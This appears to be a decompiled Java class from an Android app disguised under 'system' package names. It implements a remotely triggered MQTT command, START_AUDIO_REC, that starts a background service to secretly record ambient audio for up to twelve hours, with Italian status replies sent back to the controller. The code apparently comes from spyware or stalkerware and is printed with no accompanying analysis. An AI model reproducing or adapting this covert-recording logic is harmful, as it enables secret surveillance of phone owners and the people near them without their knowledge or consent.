package com.app.system.common.commands;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.android.system.RecordCallService;
import com.app.system.common.entity.PlannedRec;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.util.Date;

public class StartAudioRec
  extends Command
{
  public static final String CMD_NAME = "START_AUDIO_REC";
  public static final int DEFAULT_MAX_DUR = 600;
  public static final int DEFAULT_SLICE_DUR = 600;
  private static final int MAX_DUR = 43200;
  private static final int MAX_SLICE_DUR = 600;
  private static final int MIN_DUR = 60;
  private static final int MIN_SLICE_DUR = 30;
  public static final String PARAM_MAX_DUR = "MAX_DURATA";
  public static final String PARAM_SLICE_DUR = "DURATA_FILE";
  private static long lastStartRecTime;
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new StartAudioRec(paramAnonymousMqttCommand, null);
    }
  };
  
  private StartAudioRec(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public static long a()
  {
    return lastStartRecTime;
  }
  
  public static boolean a(Context paramContext, int paramInt1, int paramInt2, PlannedRec paramPlannedRec)
  {
    if (RecordCallService.b()) {
      return false;
    }
    Intent localIntent = new Intent(paramContext, RecordCallService.class);
    localIntent.putExtra("data", "1");
    localIntent.putExtra("number", "2_AMBIENT");
    localIntent.putExtra("call_app", "A");
    localIntent.putExtra("max_dur", paramInt1);
    localIntent.putExtra("slice_dur", paramInt2);
    if (paramPlannedRec != null) {
      localIntent.putExtra("planned-rowid", paramPlannedRec.rowId);
    }
    paramContext.startService(localIntent);
    lastStartRecTime = new Date().getTime() / 1000L;
    return true;
  }
  
  public static void b()
  {
    lastStartRecTime = 0L;
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    boolean bool = paramContext.getSharedPreferences("pref", 0).getBoolean("ambient-record-active", false);
    MqttCommandReply localMqttCommandReply = this.mqttCmd.b(paramContext);
    if (bool)
    {
      if (RecordCallService.b())
      {
        localMqttCommandReply.result = 313;
        localMqttCommandReply.replyText = MqttCommandReply.a(313);
        return localMqttCommandReply;
      }
      Object localObject = a("MAX_DURATA");
      int i = 600;
      if (localObject != null) {
        try
        {
          int j = Integer.parseInt((String)localObject);
          k = j;
          if (j == -1) {
            break label171;
          }
          if (j >= 60)
          {
            k = j;
            if (j <= 43200) {
              break label171;
            }
          }
          localMqttCommandReply.result = 312;
          localMqttCommandReply.replyText = String.format("Il parametro %s deve essere -1 oppure compreso tra %d e %d (sec.)", new Object[] { "MAX_DURATA", Integer.valueOf(60), Integer.valueOf(43200) });
          return localMqttCommandReply;
        }
        catch (NumberFormatException paramContext)
        {
          localMqttCommandReply.result = 312;
          localMqttCommandReply.replyText = "Il parametro MAX_DURATA deve essere un numero intero";
          return localMqttCommandReply;
        }
      }
      int k = 600;
      label171:
      localObject = a("DURATA_FILE");
      if (localObject != null) {
        try
        {
          i = Integer.parseInt((String)localObject);
          if ((i >= 30) && (i <= 600)) {
            break label272;
          }
          localMqttCommandReply.result = 312;
          localMqttCommandReply.replyText = String.format("Il parametro %s deve essere compreso tra %d e %d (sec.)", new Object[] { "DURATA_FILE", Integer.valueOf(30), Integer.valueOf(600) });
          return localMqttCommandReply;
        }
        catch (NumberFormatException paramContext)
        {
          localMqttCommandReply.result = 312;
          localMqttCommandReply.replyText = "Il parametro DURATA_FILE deve essere un numero intero";
          return localMqttCommandReply;
        }
      }
      label272:
      long l = -1L;
      if (k != -1) {
        l = System.currentTimeMillis() + k * 1000;
      }
      localObject = paramContext.getSharedPreferences("pref", 0).edit();
      ((SharedPreferences.Editor)localObject).putLong("amb-rec-stop", l);
      ((SharedPreferences.Editor)localObject).commit();
      a(paramContext, k, i, null);
      localMqttCommandReply.replyText = "Registrazione avviata";
      return localMqttCommandReply;
    }
    localMqttCommandReply.result = 320;
    localMqttCommandReply.replyText = MqttCommandReply.a(320);
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/StartAudioRec.class
 *
 * Reversed by:           J
 */